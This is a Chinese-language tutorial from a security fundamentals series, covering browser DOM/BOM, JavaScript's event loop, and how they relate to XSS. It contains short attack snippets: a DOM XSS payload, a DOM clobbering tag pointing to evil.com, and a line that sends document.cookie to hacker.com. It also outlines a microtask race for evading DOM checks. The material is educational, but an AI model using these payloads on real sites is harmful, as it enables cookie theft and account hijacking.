---
date: 2025-08-25T05:03:18+08:00
title: "Web前端底层：DOM/BOM架构与JS事件循环(Event Loop)"
weight: 10
---

# Web前端底层：DOM/BOM架构与JS事件循环(Event Loop)

在剖析了 C/C++ 的内存布局与栈溢出之后，我们将视线转移到当今互联网最庞大、最活跃的运行环境——**Web 浏览器**。

绝大多数前端安全漏洞（如 XSS 跨站脚本攻击、DOM Clobbering 破坏、点击劫持）并非源于后端的 SQL 或 PHP，而是因为攻击者深刻理解了浏览器是如何解析 HTML 的，以及 JavaScript 代码是如何在浏览器中调度的。

本文将剥开前端的华丽外衣，直击浏览器的两大核心 API（DOM 与 BOM），并深度解剖 JavaScript 诡异的“单线程事件循环”机制。

---

## 1. 浏览器眼中的网页：DOM 树与 BOM 对象

当浏览器收到一段 HTML 纯文本（如 `<html><body><h1>Hello</h1></body></html>`）时，它并不能直接运行这段文本。浏览器引擎（如 Chrome 的 Blink 引擎）会对其进行**词法分析和语法解析**，最终在内存中构建出两套核心的数据结构：**DOM 和 BOM**。

### 1.1 DOM (Document Object Model，文档对象模型)
**DOM 是 HTML 标签在内存中的面向对象映射。**
浏览器将 HTML 文本转换成了一棵倒立的“节点树”。每个标签（如 `<div>`、`<a>`）、甚至每一段文本，都是树上的一个节点（Node）。

*   **安全关联：DOM 型 XSS**
    在现代前端框架（如 Vue/React）普及之前，很多网页会使用 `document.getElementById('msg').innerHTML = user_input;` 来动态更新页面。
    如果 `user_input` 包含了恶意脚本 `<img src=x onerror=alert(1)>`，浏览器在将其挂载到 DOM 树时，会立刻解析并执行这段脚本。这就是纯前端触发、流量不经过后端的 **DOM 型 XSS 漏洞**。

*   **高级攻击：DOM Clobbering (DOM 破坏)**
    由于浏览器的一些遗留“便利特性”，如果你在 HTML 中写了 `<div id="config"></div>`，浏览器会自动在全局的 `window` 对象上挂载一个 `window.config` 变量，指向这个 div。
    如果前端代码中有 `let url = window.config.url || "http://safe.com"`，黑客就可以通过注入恶意的 HTML 标签 `<a id="config" href="http://evil.com"></a>`，强行覆盖（Clobber）掉全局的 `config` 变量，从而劫持代码的执行流！

### 1.2 BOM (Browser Object Model，浏览器对象模型)
**BOM 是浏览器提供给 JavaScript 操控“浏览器窗口本身”的接口。**
如果说 DOM 代表了网页的内容（Document），那么 BOM 就代表了浏览器的外壳（Window）。

*   **核心 BOM 对象**：
    *   `window`：全局顶级对象。
    *   `location`：控制和读取当前 URL（如 `location.href`）。
    *   `navigator`：获取用户浏览器信息（如 User-Agent）。
    *   `document`：DOM 的根节点，其实也是挂载在 BOM 的 `window.document` 上的。
*   **安全关联**：
    当发生 XSS 攻击时，黑客最喜欢调用的就是 BOM API：
    `window.location.href = "http://hacker.com/steal?cookie=" + document.cookie;`
    通过操控 BOM，黑客可以强行让受害者的浏览器带着敏感凭证跳转到恶意网站。

---

## 2. JavaScript 的灵魂：单线程与非阻塞设计

理解了浏览器提供的数据结构（DOM/BOM），我们来看看操控它们的主人——**JavaScript (JS)**。

### 2.1 为什么 JS 必须是单线程的？
与 Java 或 C++ 动辄开启几十个线程不同，**运行在浏览器中的 JS 引擎（如 V8）是绝对的单线程！**
也就是说，在同一个浏览器标签页里，同一时刻只能有一句 JS 代码在执行。

**原因很简单：为了避免 DOM 渲染的死锁。**
假设 JS 有两个线程，线程 A 正在往 `<div>` 里添加文本，线程 B 突然把这个 `<div>` 给删除了。那浏览器究竟该听谁的？为了避免复杂的加锁机制，JS 诞生之初就被设计为单线程。

### 2.2 单线程的致命缺陷与“非阻塞”补救
单线程意味着代码必须从上往下、一行一行执行（同步执行）。
如果你写了一句 `let data = fetch("http://api.com/huge_data");`，如果网络很慢，这句代码要卡 5 秒钟。那么在这 5 秒内，**整个网页将处于假死状态**（按钮点不动，动画卡住，甚至无法滚动）。

为了解决这个致命问题，浏览器引入了**异步回调（Asynchronous）**和**事件循环（Event Loop）**机制。JS 引擎把耗时的网络请求、定时器（setTimeout）统统丢给**浏览器的其他后台线程（如 Web API 线程）**去处理，自己则继续往下执行其他代码。

---

## 3. 核心机制：事件循环 (Event Loop) 深度解剖

当后台的 Web API 线程完成了网络请求，或者定时器倒计时结束了，它该如何通知单线程的 JS 引擎呢？它不能直接打断 JS 的执行，而是把**回调函数（Callback）**塞进一个队列里排队。

**事件循环 (Event Loop)** 就是 JS 引擎用来不断检查队列、并把回调函数拉回主线程执行的机制。

### 3.1 宏任务 (Macrotask) 与微任务 (Microtask)
现代浏览器的任务队列分为两种，它们的优先级决定了代码执行的先后顺序，这也是前端面试和代码逻辑混淆的重灾区：

1.  **宏任务 (Macrotask)**：
    *   包含：整体的 script 代码、`setTimeout`、`setInterval`、用户交互事件（如点击按钮）、网络请求回调。
2.  **微任务 (Microtask)**：
    *   包含：`Promise.then()`、`MutationObserver`。
    *   **特权**：微任务的优先级**绝对高于**下一个宏任务！

### 3.2 Event Loop 的运转齿轮 (执行顺序)
JS 引擎的执行逻辑是一个无限循环的齿轮：
1.  **执行一个宏任务**（通常是最开始的全局 Script 代码）。
2.  在这个宏任务执行过程中，如果遇到 `setTimeout`，就把它交给后台，倒计时结束后把回调函数塞入**宏任务队列**。
3.  如果遇到 `Promise.then()`，就把它的回调函数塞入**微任务队列**。
4.  **【关键点】当前宏任务执行完毕后，JS 引擎会立刻检查微任务队列。如果有微任务，就一口气把所有微任务全部执行完！**
5.  微任务全部清空后，浏览器可能会进行一次 UI 页面渲染（重绘）。
6.  渲染完成后，JS 引擎再去**宏任务队列**中取出下一个宏任务（如刚才那个到期的 setTimeout 回调）开始执行。回到步骤 1。

> **💻 代码推演：测试你的 Event Loop 理解**
> 思考下面这段代码的打印顺序：
> ```javascript
> console.log('1. Script start');
> 
> setTimeout(() => {
>   console.log('4. setTimeout');
> }, 0);
> 
> Promise.resolve().then(() => {
>   console.log('3. Promise');
> });
> 
> console.log('2. Script end');
> ```
> **输出顺序**：1 -> 2 -> 3 -> 4。
> **解释**：
> 1. 全局 Script（宏任务）开始执行，打印 1。
> 2. 遇到 `setTimeout`，扔进宏任务队列排队。
> 3. 遇到 `Promise`，扔进微任务队列排队。
> 4. 打印 2。全局 Script（当前宏任务）结束。
> 5. **清空微任务队列**：执行 Promise 回调，打印 3。
> 6. 微任务清空，开始执行下一个宏任务（setTimeout），打印 4。

### 3.3 安全视角下的 Event Loop 竞态条件
很多复杂的安全防御绕过（Bypass）都利用了 Event Loop 的时序差。
例如，某些防御脚本使用 `setTimeout(checkMaliciousDOM, 0)` 去检查页面是否被注入了恶意节点。
黑客可以利用 `Promise.then()`（微任务）的极高优先级，在防御脚本的宏任务（setTimeout）执行**之前**，抢先执行恶意的微任务代码，窃取数据后再把恶意节点删掉，从而实现完美的**竞态绕过 (Race Condition Evasion)**。

---

## 4. 总结

在 Web 前端的底层世界里：
*   **DOM/BOM** 是浏览器暴露给 JavaScript 的骨架与窗口，它们是 XSS 攻击最主要的载体与操控对象。
*   **单线程的 JS 引擎** 为了保证 DOM 渲染的安全性，牺牲了并发能力。
*   **Event Loop (宏任务与微任务)** 则是为了弥补单线程的卡顿，而设计出的一套极其精密的异步调度齿轮。

> **下一篇预告**：
> 既然 JavaScript 能随意操控 DOM，能发起网络请求（Fetch）。如果我在恶意网站 A 上写了一段 JS，它能在后台偷偷发起请求去读取用户在银行网站 B 里的存款余额吗？
> 
> 理论上完全可以！但现实中这并未发生。这就是由于 Web 安全领域的“万里长城”——**同源策略 (SOP)** 的存在。
> 下一篇，我们将作为整个《安全基础》系列的最终章，深度剖析 **SOP 同源策略**与为了打破 SOP 而引入的 **CORS (跨域资源共享)** 机制，以及随之而来的 CSRF 与跨域漏洞！